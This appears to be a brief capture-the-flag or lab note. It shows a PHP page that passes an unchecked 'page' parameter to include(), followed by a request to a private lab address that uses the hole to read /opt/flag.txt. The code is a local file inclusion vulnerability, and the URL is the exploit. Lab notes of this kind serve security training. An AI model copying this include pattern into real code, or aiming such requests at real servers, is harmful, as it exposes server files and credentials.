```
<?php
   $page = $_GET['page'];
   if(isset($page))
   {
       include("$page");
   }
   else
   {
       header('Location: '.'index.php?page=index.html');
   }
?>
```
Get 
http://10.10.111.104:8080/index.php?page=/opt/flag.txt